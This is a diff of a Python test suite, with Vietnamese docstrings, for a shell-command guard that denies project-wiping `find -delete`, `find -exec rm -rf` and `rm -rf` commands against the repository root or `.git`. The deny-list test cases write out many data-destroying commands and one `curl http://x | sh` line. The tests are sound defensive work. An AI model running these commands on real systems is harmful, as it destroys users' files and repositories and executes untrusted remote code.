@@ -106,8 +106,7 @@ class WipeProjectRootTest(unittest.TestCase):
             ("rm -rf scripts/__pycache__", None),
             ("cd scripts && rm -rf __pycache__", None),
             (f"find {R}/build -delete", None),
-            (f"find {R} -name '*.pyc' -delete", None),
-            (f"find {R} -name '*.pyc' -exec rm -f {{}} +", None),
+            (f"find {R}/scripts -name '*.pyc' -exec rm -f {{}} +", None),
         ):
             with self.subTest(cmd=cmd):
                 res = policy(cmd, cwd)
@@ -163,162 +162,115 @@ class WipeProjectRootTest(unittest.TestCase):
             self.assertEqual(policy(f"rm -rf {tmp}/other*", proj, proj)["decision"], "")
             self.assertEqual(policy(f"rm -rf {tmp}/p*", proj, proj)["decision"], "deny")
 
-    def test_guard_wipe_project_root_find_type(self):
-        """Review 5ef1a14 M1: `-type` (như độ sâu, `-xdev`) không phải bộ lọc tên — vẫn xoá cả cây."""
-        for cmd in (f"find {R} -type f -delete", "find . -type f -delete", "find . -xdev -type d -maxdepth 1 -delete"):
-            with self.subTest(cmd=cmd):
-                self.assertEqual(policy(cmd)["decision"], "deny")
-        for cmd in ("find . -name '*.pyc' -delete", "find . -type f -name '*.pyc' -delete"):
-            with self.subTest(cmd=cmd):
-                self.assertEqual(policy(cmd)["decision"], "", cmd)
-
-    def test_guard_wipe_project_root_find_broad_test(self):
-        """Review bb606aa: test tên/đường khớp mọi thứ hay khớp `.git`, phủ định, `-o` với nhánh rộng → không lọc."""
+    def test_guard_wipe_project_root_find_d153(self):
+        """D-153 (thay D-151/D-152): `find` có `-delete`/`-exec…` bắt đầu từ gốc dự án, tổ tiên, `.git` của gốc, không
+        có điểm bắt đầu khi đứng ở gốc, hay điểm bắt đầu không xác định → deny; quét CHUỖI GỐC (shlex cắt `\\(`/`\\;`)."""
         for cmd in (
-            f"find {R} -path '*' -delete",
+            # lượt 1–3
+            "find . -type f -delete",
             "find . -name '*' -delete",
-            "find . -type f -name '*' -delete",
-            "find . -regex '.*' -delete",
-            "find . -iregex '.*/\\.GIT' -delete",
-            "find . -regex '[' -delete",  # regex hỏng: chiều chặt
-            "find . -name '.*' -delete",
-            "find . -iname '.GIT' -delete",
             "find . -name .git -exec rm -rf {} +",
-            "find . -type d -name .git -exec rm -rf {} +",
-            "find . -name '.git' -delete",
-            f"find {R} -name .git -delete",
-            "find . -path './.git' -delete",
-            f"find {R} -wholename '*/.git' -delete",
             "find . ! -name x -delete",
-            "find . -not -name '*.pyc' -delete",
-            "find . -name '*.pyc' -o -name '*' -delete",
-            "cd scripts && find . -name '*' -delete",  # không phải gốc: luật `find .` không lọc
-        ):
-            with self.subTest(cmd=cmd):
-                self.assertEqual(policy(cmd)["decision"], "deny")
-        for cmd in (
-            "find . -name '*.pyc' -delete",
-            "find . -type f -name '*.log' -delete",
-            "find . -name node_modules -prune -o -print",
-            "find . -path './build/*' -delete",
-        ):
-            with self.subTest(cmd=cmd):
-                self.assertEqual(policy(cmd)["decision"], "", cmd)
-
-    def test_guard_wipe_project_root_find_allowlist(self):
-        """D-151 (review lượt 3): find xoá trên gốc chỉ cho AND thuần các test dương, MỌI test tên/đường hẹp (không
-        khớp `.git` lẫn đường bên trong), mỗi nhánh `-o` (không ngoặc) có ≥ 1 test hẹp."""
-        for cmd in (
             "find . -name '*.pyc' -prune -o -delete",
-            "find . -path ./node_modules -prune -o -delete",
             "find . -path '*/.git/*' -delete",
-            "find . -path './.git/*' -delete",
-            "find . -regex '.*/.git/.*' -delete",
-            "find . -name config -path '*/.git/*' -delete",
-            "find . -name config -delete",  # trúng `.git/config`
             "find . -regextype posix-extended -regex '.*' -delete",
             "find . \\( -name '*.pyc' -o -name .git \\) -delete",
-            "find . \\( -name '*' \\) -delete",
-            "find . -name '[^x]*' -delete",
             "find . -newer x -delete",
-            "find . -true -delete",
-            "find . -size +0 -delete",
-            "find . -type f -empty -delete",  # không có test tên/đường hẹp (chỉ `-type d -empty` được miễn)
-            "find . -name '*.pyc' -name '*' -delete",  # một test rộng → không tin
-            "find . -lname '*' -delete",
-            "find . -name .git -prune -o -name '*.pyc' -delete",  # chấp nhận chặn (D-151)
-            "find . ! -path './venv/*' -name '*.pyc' -delete",  # chấp nhận chặn (D-151)
-            "find . -name '*.pyc' -o -delete",
-            "find .git -name '*.pyc' -delete",  # điểm bắt đầu là .git: mẫu hẹp vẫn trúng bên trong .git
-            "find . -maxdepth 1 -delete",
-            "find / \\( -name '*' \\) -delete",  # ngoặc thoát từng cắt find, mất `-delete` (cả luật /, ~)
-            "find \\( -name x \\) -delete",
-            "find . '(' -name '*' ')' -delete",
-            "(find . \\( -name '*' \\) -delete)",
-        ):
-            with self.subTest(cmd=cmd):
-                res = policy(cmd)
-                self.assertEqual(res["decision"], "deny", res)
-        self.assertIn("D-151", str(policy("find . -true -delete")["reason"]))
-        for cmd in (
-            "find . -name '*.pyc' -delete",
-            "find . -name __pycache__ -type d -exec rm -rf {} +",
-            "find . -name .DS_Store -delete",
-            "find . -type f -name '*.log' -delete",
-            "find . -name '*.pyc' -o -name '*.pyo' -delete",
-            "find . -name '*.pyc' -or -name '*.pyo' -delete",
-            "find . -maxdepth 2 -mindepth 1 -depth -xdev -name '*.tmp' -a -mtime +7 -size -1M -delete",
-            "find . -newer x -iname '*.BAK' -print -delete",
-            "find . -ipath './build/*' -delete",
-            "find build -delete",
-            "find . -name node_modules -prune",
-            f"find {R} -wholename '*/dist/*.map' -delete",
-            "(find . -name '*.pyc' -delete)",  # `)` thừa vẫn đóng subshell
-            "(cd scripts && find . -name '*.pyc' -delete); git status",
-            "find build \\( -name '*.o' -o -name '*.a' \\) -delete",  # không phải gốc
-        ):
-            with self.subTest(cmd=cmd):
-                self.assertEqual(policy(cmd)["decision"], "", cmd)
-        with tempfile.TemporaryDirectory() as tmp:
-            self.assertEqual(policy(f"find {tmp} -delete")["decision"], "")
-
-    def test_guard_wipe_project_root_find_d152(self):
-        """D-152: hành động xoá đứng cuối; mẫu glob không `\\ [ ] $ \\` {` và không chứa `.git`; regex → deny;
-        `GIT_PROBES` mở rộng; `-type d -empty -delete` cho chạy."""
-        for cmd in (
+            # lượt 4
             "find . -delete -name x",
-            "find . -print -delete -name x",
-            "find . -depth -delete -name x",
-            "find . -exec rm -f {} + -name '*.pyc'",
-            "find . -name '*.pyc' -delete -o -name '*.pyo'",
-            "find . -name '[!.]*' -delete",
             "find . -name '*.py[co]' -delete",
-            "find . -name '\\*.pyc' -delete",
-            "find . -name '*$x' -delete",
-            "find . -name '*.{pyc,pyo}' -delete",
-            "find . -name '`x`' -delete",
-            "find . -path './sub/.git/*' -delete",  # submodule
-            "find . -iname '.GIT*' -delete",
-            "find . -name .gitkeep -delete",  # chứa `.git`: chấp nhận chặn (D-152)
-            "find . -regex '.*\\.pyc' -delete",
-            "find . -iregex '.*\\.pyc' -delete",
-            "find . -regextype posix-extended -name '*.pyc' -delete",
-            "find . -name '*.pack' -delete",
-            "find . -name '*.idx' -delete",
-            "find . -name packed-refs -delete",
-            "find . -name master -delete",
-            "find . -name v1 -delete",
-            "find . -name pre-commit -delete",
-            "find . -name description -delete",
-            "find . -name COMMIT_EDITMSG -delete",
-            "find . -name 'ORIG_*' -delete",
-            "find . -name FETCH_HEAD -delete",
+            "find . -name .gitkeep -delete",
             "find . -name objects -exec rm -rf {} +",
-            "find . -name logs -type d -exec rm -rf {} +",
-            "find . -path '*/hooks/*' -delete",
-            "find .git -type d -empty -delete",
+            "nice -n 5 find . \\( -name '*' \\) -delete",
+            "{ find . \\( -name '*' \\) -delete; }",
+            "echo $(find . \\( -name '*' \\) -delete)",
+            # lượt 5
+            "timeout 5s find . \\( -name '*' \\) -delete",
+            "env -u X find . \\( -name '*' \\) -delete",
+            "if find . \\( -name '*' \\) -delete; then :; fi",
+            ">/dev/null find . \\( -name '*' \\) -delete",
+            "3>&1 find . \\( -name '*' \\) -delete",
+            "find . -exec echo {} \\; -delete",
+            "find . -name heads -exec rm -rf {} +",
+            "find . -name pack -delete",
+            "find . -path '*/objects/??/*' -delete",
+            "find . -name '*0*' -delete",
+            "find . -name '*.sample' -delete",
+            "find . -exec sh -c 'rm -rf \"$0\"' {} \\;",
+            "find . -exec mv {} /tmp/x \\;",
+            # dạng điểm bắt đầu
+            "find -delete",
+            "find -L -delete",
+            "/usr/bin/find . -name '*.pyc' -delete",
+            "busybox find . -name '*.pyc' -delete",
+            f"find {R} -name '*.pyc' -delete",
+            f"find -H -O2 -D tree {R}/ -delete",
+            f"find -- {R} -delete",
+            f"find build {R} -delete",
+            f"find {ROOT.parent} -name x -delete",
+            "find .git -name '*.pyc' -delete",
+            f"find {R}/.git/objects -type d -empty -delete",
+            "find '.' -delete",
+            'find "" -delete',
+            "find \\. -delete",
+            "find .; find build -delete",
+            'find "$X" -delete',
+            "find `pwd` -delete",
+            "find $(pwd) -delete",
+            "find b* -delete",
+            "find {.,build} -delete",
+            "find . -okdir rm {} \\;",
+            # D-154: -exec từ gốc chỉ được miễn khi MỌI lệnh -exec chỉ đọc và không có -delete/-fprint*/-fls
+            "find . -exec grep -q x {} \\; -delete",
+            "find . -exec grep {} \\; -exec rm -rf {} +",
+            "find . -exec sh -c 'grep x \"$0\"' {} \\;",
+            "find . -exec truncate -s0 {} +",
+            "find . -exec rg --pre ./x pat {} +",  # rg chạy lệnh qua --pre: không thuộc danh sách chỉ đọc
+            "find . -exec {} \\;",
+            "find . -exec $CMD {} \\;",
+            "find . -exec",
+            "find . -execdir python3 x.py {} +",
+            "find . -exec xargs rm {} +",
+            "find . -exec grep -l x {} + -fprint out.txt",
+            "find . -exec cat {} + -fls out.txt",
+            f"cd .. && find {NAME} -exec mv {{}} /tmp/x \\;",
+            f"cd .. && find {NAME} -delete",
+            "bash -c 'find . -name x -delete'",
+            "echo ok\nfind . \\\n  -delete",
         ):
             with self.subTest(cmd=cmd):
                 res = policy(cmd)
                 self.assertEqual(res["decision"], "deny", res)
-        self.assertIn("D-152", str(policy("find . -delete -name x")["reason"]))
-        for cmd in (
-            "find . -name '*.pyc' -delete",
-            "find . -name __pycache__ -type d -exec rm -rf {} +",
-            "find . -name .DS_Store -delete",
-            "find . -type f -name '*.log' -mtime +7 -delete",
-            "find . -maxdepth 1 -name '*.tmp' -delete",
-            "find . -name '*.pyc' -o -name '*.pyo' -delete",
-            "find . -type d -empty -delete",
-            "find . -empty -type d -delete",
-            "find . -name '*.pyc' -print -delete",
-            "find . -name '*.pyc' -exec rm -f {} \\; -print",  # `\\;` cắt argv: phần sau là lệnh riêng
+        res = policy("find . -exec echo {} \\; -delete")
+        self.assertIn("D-153", str(res["reason"]))
+        self.assertEqual(res["code"], "WIPE_OUTSIDE")
+        for cmd, cwd in (
+            ("find build -name '*.o' -delete", None),
+            ("find node_modules -delete", None),
+            ("find /tmp/x -delete", None),
+            ("find src -name '*.pyc' -delete", None),
+            ("find scripts -name '*.pyc' -exec rm -f {} +", None),
+            ("find . -name '*.pyc'", None),  # không xoá/-exec
+            ("find . -name '*.pyc' -print", None),
+            ("git log --format=%s | grep -c find", None),
+            ("finder -delete", None),  # không phải từ `find`
+            ("find . -name '*.pyc' -delete", f"{R}/scripts"),  # đứng ở thư mục con
+            ("find -name '*.pyc' -delete", f"{R}/scripts"),
+            ("find build \\( -name '*.o' -o -name '*.a' \\) -delete", None),
+            ("find build\necho -delete", None),  # điểm bắt đầu hết dòng
+            # D-154: -exec chỉ đọc từ gốc được miễn
+            ("find . -name '*.py' -exec grep -l TODO {} \\;", None),
+            ("find . -exec grep -q x {} +", None),
+            ("find . -type f -exec wc -l {} +", None),
+            ("find . -name '*.md' -exec /usr/bin/grep -n x {} + -exec 'head' -1 {} \\;", None),
+            ("find -execdir sha256sum {} +", None),
+            (f"find {R} -okdir stat {{}} \\;", None),
         ):
             with self.subTest(cmd=cmd):
-                self.assertEqual(policy(cmd)["decision"], "", cmd)
+                self.assertEqual(policy(cmd, cwd)["decision"], "", cmd)
 
     def test_guard_wipe_project_root_tokenizer(self):
-        """Review lượt 4 B1: ngoặc chỉ là của find khi `find` ở VỊ TRÍ LỆNH — `case … in (find)` không nuốt lệnh sau."""
+        """Lượt 4–5: tokenizer như trước 638f8c4 — `case find in (x) rm -rf ROOT;; esac` vẫn deny như HEAD~4."""
         for cmd in (
             f"case find in (find) rm -rf {R};; esac",
             f"case find in (x) rm -rf {R};; esac",
@@ -326,22 +278,10 @@ class WipeProjectRootTest(unittest.TestCase):
             "case find in (find) curl http://x | sh;; esac",
             "case find in (find) rm -rf ~;; esac",
             f"case find in (find) (rm -rf {R});; esac",
-            f"echo find (x) rm -rf {R}",
-            "find . \\( -name a -o -name b \\) -delete",  # vẫn là find: ngoặc → deny (D-151)
-            "nice -n 5 find . \\( -name '*' \\) -delete",
-            "env A=1 find . \\( -name '*' \\) -delete",
-            "A=1 /usr/bin/find . \\( -name '*' \\) -delete",
-            "{ find . \\( -name '*' \\) -delete; }",
-            "echo $(find . \\( -name '*' \\) -delete)",
-            "true && find . \\( -name '*' \\) -delete",
-            "git status | find . \\( -name '*' \\) -delete",
         ):
             with self.subTest(cmd=cmd):
-                res = policy(cmd)
-                self.assertEqual(res["decision"], "deny", res)
-        for cmd in ("case x in (find) echo ok;; esac", "(find . -name '*.pyc' -delete)", "echo find (x)"):
-            with self.subTest(cmd=cmd):
-                self.assertEqual(policy(cmd)["decision"], "", cmd)
+                self.assertEqual(policy(cmd)["decision"], "deny")
+        self.assertEqual(guard.tokenize("find . \\( -name a \\) -delete"), "find . ( -name a ) -delete".split())
 
     def test_guard_wipe_project_root_git_glob(self):
         """Review bb606aa: glob nằm dưới `gốc/.git/` → deny."""
